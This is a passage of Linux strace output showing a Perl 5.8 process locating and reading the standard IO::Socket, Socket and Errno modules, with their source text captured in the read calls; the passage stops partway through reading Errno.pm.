10004 07:30:53.709979 _llseek(6, 3425, [3425], SEEK_SET) = 0
10004 07:30:53.709997 _llseek(6, 0, [3425], SEEK_CUR) = 0
10004 07:30:53.710007 close(6)          = 0
10004 07:30:53.710030 stat64("/etc/perl/IO/Socket.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.710044 stat64("/etc/perl/IO/Socket.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.710057 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.710070 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.710088 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.710101 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.710115 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.710126 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.710140 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.710846 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.710864 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.710893 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
10004 07:30:53.710914 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
10004 07:30:53.710929 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed958) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.710940 _llseek(6, 0, [0], SEEK_CUR) = 0
10004 07:30:53.710957 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
10004 07:30:53.711272 stat64("/etc/perl/Socket.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.711287 stat64("/etc/perl/Socket.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.711389 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10002 07:30:53.711452 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10002 07:30:53.711474 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
10004 07:30:53.711483 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.711497 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.711510 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.711537 stat64("/usr/lib/perl5/Socket.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10002 07:30:53.711549 <... rt_sigprocmask resumed> [], 8) = 0
10002 07:30:53.711558 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
10004 07:30:53.711566 stat64("/usr/lib/perl5/Socket.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.711579 stat64("/usr/share/perl5/Socket.pmc",  <unfinished ...>
10002 07:30:53.711586 <... rt_sigprocmask resumed> NULL, 8) = 0
10002 07:30:53.711593 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10004 07:30:53.711605 <... stat64 resumed> 0xbfeed78c) = -1 ENOENT (No such file or directory)
10002 07:30:53.711612 rt_sigaction(SIGINT, {0x807f150, [], 0},  <unfinished ...>
10004 07:30:53.711620 stat64("/usr/share/perl5/Socket.pm",  <unfinished ...>
10002 07:30:53.711628 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
10004 07:30:53.711635 <... stat64 resumed> 0xbfeed69c) = -1 ENOENT (No such file or directory)
10002 07:30:53.711643 waitpid(-1,  <unfinished ...>
10004 07:30:53.711659 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.732353 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
10004 07:30:53.732354 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
10004 07:30:53.732354 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed4a8) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.732354 _llseek(8, 0, [0], SEEK_CUR) = 0
10004 07:30:53.732375 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
10004 07:30:53.732916 brk(0x8239000)    = 0x8239000
10004 07:30:53.733121 read(8, "", 4096) = 0
10004 07:30:53.733136 close(8)          = 0
10004 07:30:53.733226 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
10004 07:30:53.733251 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
10004 07:30:53.733323 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
10004 07:30:53.733339 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
10004 07:30:53.733445 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
10004 07:30:53.733464 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7cf4000
10004 07:30:53.733478 mmap2(0xb7cf9000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7cf9000
10004 07:30:53.733494 close(8)          = 0
10004 07:30:53.734100 brk(0x825a000)    = 0x825a000
10004 07:30:53.734247 stat64("/etc/perl/Errno.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.734276 stat64("/etc/perl/Errno.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.734313 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.734343 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.734357 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.734369 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.734383 stat64("/usr/lib/perl5/Errno.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.734395 stat64("/usr/lib/perl5/Errno.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.734408 stat64("/usr/share/perl5/Errno.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.734420 stat64("/usr/share/perl5/Errno.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.734433 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.734445 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
10004 07:30:53.734466 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
10004 07:30:53.734480 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed4a8) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.734492 _llseek(8, 0, [0], SEEK_CUR) = 0
10004 07:30:53.734514 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
10004 07:30:53.735278 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq 